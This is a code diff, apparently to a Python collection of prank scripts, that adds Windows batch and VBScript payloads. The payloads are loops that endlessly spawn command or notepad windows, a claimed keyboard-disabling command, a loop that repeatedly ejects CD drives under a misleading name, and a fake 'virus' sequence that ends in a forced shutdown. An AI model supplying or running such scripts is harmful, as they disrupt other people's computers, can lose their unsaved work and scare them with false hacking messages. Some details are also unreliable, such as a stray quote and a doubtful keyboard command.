@@ -341,10 +341,52 @@ exit
 """
 
 
+endless_cmd = """
+@echo off
+:loop
+start
+goto loop
 
+"""
 
+keyboard_lock = """
+@echo off
+rundll32 keyboard,disable
+exit
+"""
+ghost_keyboard_prank = """
+Set oWMP = CreateObject("WMPlayer.OCX.7")
+Set colCDROMs = oWMP.cdromCollection
+Do
+    If colCDROMs.Count >= 1 Then
+        For i = 0 To colCDROMs.Count - 1
+            colCDROMs.Item(i).Eject
+        Next
+    End If
+    WScript.Sleep 3000
+Loop
+"""
 
+virus_loading = """"
+@echo off
+color 0A
+echo Initializing Virus...
+ping -n 3 127.0.0.1 >nul
+echo Accessing system files...
+ping -n 3 127.0.0.1 >nul
+echo Uploading data to unknown server...
+ping -n 3 127.0.0.1 >nul
+echo SYSTEM ERROR: Critical Failure!
+ping -n 3 127.0.0.1 >nul
+shutdown /s /t 30 /c "You've been hacked!"
+exit
+"""
 
+infinite_windows = """@echo off
+:loop
+start notepad
+goto loop
+"""
 
 
 
